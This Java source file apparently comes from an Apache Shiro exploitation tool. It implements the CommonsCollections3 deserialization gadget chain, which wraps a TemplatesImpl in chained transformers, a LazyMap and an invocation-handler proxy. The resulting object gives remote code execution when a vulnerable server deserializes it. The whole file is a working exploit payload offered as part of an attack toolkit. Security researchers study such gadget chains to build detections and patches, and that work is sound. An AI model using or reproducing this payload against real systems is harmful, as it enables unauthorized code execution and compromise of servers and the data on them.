package com.sma11new.exp.shiro.attack.payloads;

import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Gadgets;
import com.sma11new.exp.shiro.attack.util.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

@Dependencies(value={"commons-collections:commons-collections:3.1"})
public class CommonsCollections3
implements ObjectPayload<Object> {
    @Override
    public Object getObject(Object templatesImpl) throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})};
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class, new Class[0]);
        InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
        Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);
        return handler;
    }
}

